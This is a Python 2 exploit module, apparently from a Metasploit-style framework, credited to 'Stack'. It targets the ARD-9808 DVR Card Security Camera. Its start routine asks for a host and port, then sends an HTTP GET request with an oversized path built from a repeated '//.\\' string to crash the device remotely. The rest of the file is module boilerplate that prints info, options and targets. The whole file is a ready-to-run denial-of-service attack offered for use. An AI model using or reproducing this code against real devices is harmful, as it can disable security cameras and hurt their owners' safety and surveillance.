def about():
	print '''	'''

def auto_help(name,rank,description):
	stbl = "  " + name + " "*(13-len(name)+4) + rank + " "*(8-len(rank)+4) + description
	return stbl

def auto_targ(targetlist):
	print "Vulnrable Applications (ARD9808dos)"
	print
	print "  ID	   Device"
	print "  --	   ------"
	for _ in targetlist:
		print "  "+_+" "*(9-len(_))+targetlist[_]
	print

try:
	if desc == "get-id":
		print auto_help("ARD9808dos","Normal","Description")
except:
	pass

def auto_info(name="", module="exploits", plat="", priv="", lic="", rank="Normal", release="N/A", by="N/A"):
	print
	print "Publisher Information for ARD9808dos"
	print
	print "      Name:","ARD9808dos"
	print "    Module:",module
	print "  Platform:","Python"
	print "Privileged:","No"
	print "   License:","None"
	print "      Rank:",rank
	print " Disclosed:",release

def auto_opt(name,cset,req,description):
	stbl = "  " + name + " "*(9-len(name)) + cset + " "*(15-len(cset)+2) + req + " "*(8-len(req)+2) + description
	print stbl

class ARD9808dos(object):
	def start(self):
		import socket
		import sys
		print "-"*36
		print " ARD-9808 DVR Card Security Camera <= Remote Denial Of Service  "
		print " author: Stack												  "
		print "-"*36
		host = raw_input("Host: ")
		port = input("Port: ")
		try:
			buff = "//.\\" * 1000
			request =  "GET " + buff + " HTTP/1.0"
			socket.setdefaulttimeout(3)
			connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			connection.connect((host, port))
			connection.send(request)
			raw_input('Exploit completed. Press "Enter" to quit...\n')
		except:
			raw_input('Unable to connect. Press "Enter" to quit...\n')


def show_opt():
	print
	print "Module Options (ARD9808dos)"
	print
	print "  Name	 Current Setting  Required  Description"
	print "  ----	 ---------------  --------  -----------"
	print "Raw Input Arguments"
	print 

try:
	if desc == "get-opt":
		show_opt()
except:
	pass

try:
	if desc == "proc":
		try:
			program = ARD9808dos()
			program.start()
		except Exception as e:
			print e
			print "Options Still Unset"
			time.sleep(0.3)
			show_opt()
			auto_targ({"1":"ARD-9808 DVR Card Security Camera"})
			auto_info()
except:
	pass
